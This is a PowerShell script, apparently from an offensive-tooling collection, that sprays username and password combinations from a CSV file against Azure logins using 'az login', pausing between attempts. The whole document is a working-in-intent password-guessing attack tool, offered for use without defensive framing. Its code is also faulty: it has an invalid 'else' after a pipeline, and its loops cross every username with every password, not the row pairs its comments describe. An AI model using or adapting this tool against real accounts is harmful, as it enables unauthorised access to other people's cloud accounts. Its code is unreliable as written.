# Azure password guesser. Takes in a CSV with a username and password column 
# and makes azure login attempts using the credentials provided with a 15-second delay each iteration
# This is very basic and doesn't take into account evasion tactics

# CSV should look as follows:
# |	username    | 	password    |
# |	exampleuser |	LetMeIn123! |
# |     sampleuser2 |   pwordguess  |

# Needs to be run from elevated Powershell prompt
# Example Usage: > AzurePasswordGuesser.ps1 -path C:\users\public\creds.csv
#Requires -RunAsAdministrator

[cmdLetBinding()]
param(
    $path
)
$csv = import-csv $path

Get-Module | ForEach-Object{
    if($_.Name -eq "Azure"){
		foreach($username in $csv.username){
			foreach($password in $csv.password){
				az login -u $username -p $password
				start-sleep -Seconds 15
			}
        }
	}
    else{
		Get-InstalledModule | foreach-Object{
			if($_.Name -eq "Azure") { Import-Module Azure | Out-Null }
			start-sleep -second 5
		}
		else{
			Write-Host -f Red "The Azure PowerShell module is missing. Please install with 'install-module azure'"
		}
    }
}
